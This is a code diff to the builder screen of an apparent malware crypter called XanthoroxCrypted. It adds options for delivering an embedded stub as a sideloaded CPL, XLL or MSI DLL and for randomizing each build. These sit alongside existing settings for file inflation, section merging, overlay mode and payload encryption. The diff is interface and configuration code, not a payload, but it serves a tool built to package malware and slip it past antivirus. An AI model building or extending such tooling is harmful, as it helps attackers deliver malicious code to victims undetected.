@@ -17,6 +17,8 @@ namespace XanthoroxCrypted.Views
         public BuilderView()
         {
             InitializeComponent();
+            ChkSideloadFormat.Checked += (s, e) => CmbSideloadFormat.IsEnabled = true;
+            ChkSideloadFormat.Unchecked += (s, e) => CmbSideloadFormat.IsEnabled = false;
         }
 
         private void BtnBrowse_Click(object sender, RoutedEventArgs e)
@@ -106,6 +108,9 @@ namespace XanthoroxCrypted.Views
             ChkInflate.IsChecked = false; // Inflate defaults OFF (80MB is large)
             ChkSectionMerge.IsChecked = state;
             ChkOverlayMode.IsChecked = state;
+            // M4 toggles
+            ChkSideloadFormat.IsChecked = false; // Sideload defaults OFF
+            ChkBuildRandomization.IsChecked = state;
         }
 
         // ═══ BUILD PIPELINE ═══
@@ -231,6 +236,10 @@ namespace XanthoroxCrypted.Views
                         config.OverlayMode    = ChkOverlayMode.IsChecked == true;
                         config.EncAlgorithm = (byte)cipherIndex;
                         config.ResearchPackage = researchPkg;
+                        // M4: Sideload delivery format
+                        config.SideloadFormat = ChkSideloadFormat.IsChecked == true;
+                        config.SideloadFormatType = (byte)(CmbSideloadFormat?.SelectedIndex ?? 0);
+                        config.BuildRandomization = ChkBuildRandomization.IsChecked == true;
                     });
 
                     // ══ VALIDATE & AUTO-FIX CONFLICTS ══
@@ -259,8 +268,15 @@ namespace XanthoroxCrypted.Views
                     // Extract embedded stub from resources
                     byte[] stubData;
                     var assembly = Assembly.GetExecutingAssembly();
-                    using (var stream = assembly.GetManifestResourceStream("XanthoroxCrypted.Stub.exe"))
+
+                    // Use stub.dll for sideload DLL formats (CPL/XLL/MSI)
+                    bool needsDll = config.SideloadFormat && config.SideloadFormatType >= 1 && config.SideloadFormatType <= 3;
+                    string resourceName = needsDll ? "XanthoroxCrypted.Stub.dll" : "XanthoroxCrypted.Stub.exe";
+
+                    using (var stream = assembly.GetManifestResourceStream(resourceName))
                     {
+                        if (stream == null && needsDll)
+                            return "ERR: Embedded Stub.dll resource not found. Run build_stub_dll.bat first.";
                         if (stream == null)
                             return "ERR: Embedded Stub.exe resource not found.";
                         stubData = new byte[stream.Length];
@@ -362,6 +378,9 @@ namespace XanthoroxCrypted.Views
             ChkInflate.IsChecked       = config.Inflate;
             ChkSectionMerge.IsChecked  = config.SectionMerge;
             ChkOverlayMode.IsChecked   = config.OverlayMode;
+            // M4 toggles
+            ChkSideloadFormat.IsChecked = config.SideloadFormat;
+            ChkBuildRandomization.IsChecked = config.BuildRandomization;
 
             _suppressPresetChange = false;
 
